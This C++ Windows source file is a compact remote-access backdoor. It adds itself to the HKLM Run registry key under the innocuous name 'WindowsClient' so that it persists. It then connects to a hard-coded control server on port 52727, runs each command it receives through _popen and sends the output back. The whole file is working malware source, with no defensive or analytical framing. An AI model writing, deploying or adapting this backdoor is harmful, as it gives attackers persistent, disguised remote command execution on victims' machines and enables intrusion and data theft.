#pragma comment(lib, "ws2_32.lib")

#include <winsock2.h>
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <string>
#include <iostream>

#define SERV_PORT 52727 // The port the control server is listening on
const char szHost[] = "192.168.1.140";

int main(const int argc, const char* argv[]){
	// === First ensure persistence:
	HKEY hKey;
    LONG lResult = RegOpenKeyEx(
        HKEY_LOCAL_MACHINE,
        TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"),
        0,
        KEY_WRITE,
        &hKey
    ); /* wont bother handling errors */
    char szPath[MAX_PATH];
    DWORD dwSize = GetModuleFileName(NULL, szPath, MAX_PATH);
	lResult = RegSetValueEx(
		hKey,
		TEXT("WindowsClient"),
		0,
		REG_SZ,
		(BYTE*)szPath,
		dwSize
	); /* wont bother handling errors */
	RegCloseKey(hKey);

    // Initialise winsock
    WSAData wsaData;
    WORD DllVersion = MAKEWORD(2, 1);
    if(WSAStartup(DllVersion, &wsaData) != 0){ // Initiate use of the winsock DLL
        ExitProcess(EXIT_FAILURE);
    }

    // Create socket
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if(!sock){
        ExitProcess(EXIT_FAILURE);
    }

    // Get server info
    HOSTENT* host = gethostbyname(szHost);
    if(host == nullptr){
        ExitProcess(EXIT_FAILURE);
    }

    // Define server info
    SOCKADDR_IN sin;
    ZeroMemory(&sin, sizeof(sin)); // Make sure the whole struct is set to 0
    sin.sin_port = htons(SERV_PORT);
    sin.sin_family = AF_INET;
    memcpy(&sin.sin_addr.S_un.S_addr, host->h_addr_list[0], sizeof(sin.sin_addr.S_un.S_addr)); // Copy address into sin...S_addr

    // Connect to the server
    if(connect(sock, (const sockaddr*)&sin, sizeof(sin)) != 0){
        ExitProcess(EXIT_SUCCESS);
    }

    char szBuffer[1024]; // A buffer to receive commands on
    while(1){
        ZeroMemory(&szBuffer, sizeof(szBuffer));
        recv(sock, szBuffer, 1024, 0);
        printf("RECVCMD: %s\n", szBuffer);
        FILE* p = _popen(szBuffer, "r");
        char szCmdResultBuffer[4096];
        std::string result;
		while(fgets(szCmdResultBuffer, sizeof(szCmdResultBuffer), p) != nullptr) {
			result += szCmdResultBuffer;
		}
		_pclose(p);
		std::cout << "SNDRSLT: " << result << std::endl;
		send(sock, result.c_str(), result.length(), 0);
	}

    closesocket(sock);
    ExitProcess(EXIT_SUCCESS); // Like return, but the OS/kernel likes it a bit more - best practice
}
